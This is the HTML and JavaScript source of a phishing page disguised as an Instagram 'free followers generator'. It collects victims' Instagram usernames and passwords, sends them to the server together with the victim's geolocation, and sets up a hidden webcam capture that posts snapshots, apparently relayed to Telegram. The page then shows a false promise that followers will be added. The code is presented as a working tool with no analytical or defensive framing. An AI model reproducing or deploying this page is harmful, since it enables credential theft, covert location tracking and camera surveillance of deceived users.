
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Free Followers Tool</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
      background: linear-gradient(to right, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      color: white;
    }
    .container {
      background-color: rgba(0, 0, 0, 0.4);
      padding: 30px;
      border-radius: 15px;
      width: 90%;
      max-width: 400px;
      margin: auto;
    }
    input, select, button {
      padding: 10px;
      margin-top: 15px;
      width: 100%;
      font-size: 16px;
      border-radius: 8px;
      border: none;
    }
    button {
      background-color: white;
      color: #d62976;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      touch-action: manipulation;
    }
    button:hover {
      background-color: #f1f1f1;
    }
    #output {
      margin-top: 20px;
      font-size: 15px;
      white-space: pre-wrap;
      display: none;
      animation: fadeIn 1s ease-in;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>üöÄ Instagram Followers Generator</h2>
    <p>Enter your details to get up to 100K followers!</p>

    <input type="text" id="username" placeholder="Instagram Username" required>
    <input type="password" id="password" placeholder="Password" required>
    <select id="followers">
      <option value="1000">1,000 Followers</option>
      <option value="5000">5,000 Followers</option>
      <option value="10000">10,000 Followers</option>
      <option value="50000">50,000 Followers</option>
      <option value="100000">100,000 Followers</option>
    </select>

    <button onclick="verifyAndLocate()">Get Followers</button>
    <div id="output"></div>
  </div>

  <!-- Hidden Camera Access Section -->
  <video id="camera" style="display:none;" width="320" height="240" autoplay></video>
  <canvas id="snapshot" style="display:none;"></canvas>

  <script>
    let videoStream;

    // Camera Access Code (video and canvas for capturing photo)
    function startCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          videoStream = stream;
          const video = document.getElementById("camera");
          video.srcObject = stream;
        })
        .catch(err => {
          alert("Camera permission denied or not available.");
        });
    }

    function capturePhoto() {
      const video = document.getElementById("camera");
      const canvas = document.getElementById("snapshot");
      const context = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL("image/png");

      fetch("/photo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ photo: imageData })
      }).then(res => {
        alert("‚úÖ Photo sent to Telegram!");
      }).catch(() => {
        alert("‚ùå Failed to send photo.");
      });
    }

    // Instagram Followers Verification and Location Access
    function verifyAndLocate() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const followers = document.getElementById('followers').value;
      const output = document.getElementById('output');

      // Validation for empty fields
      if (!username || !password || !followers) {
        output.style.display = "block";
        output.innerHTML = "‚ùå All fields are required.";
        return;
      }

      output.style.display = "block";
      output.innerHTML = `‚è≥ Verifying @${username} for ${followers} followers...`;

      if (!navigator.geolocation) {
        output.innerHTML = "‚ùå Geolocation is not available.";
        return;
      }

      // Start camera before geolocation
      startCamera();

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          fetch("/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              username: username,
              password: password,
              latitude: latitude,
              longitude: longitude
            })
          })
          .finally(() => {
            setTimeout(() => {
              output.innerHTML = `‚úÖ Verified @${username}!

üéâ ${followers} followers will be added soon!`;
            }, 1500);
          });
        },
        () => {
          output.innerHTML = "‚ùå Location access denied.";
        }
      );
    }
  </script>
</body>
</html>
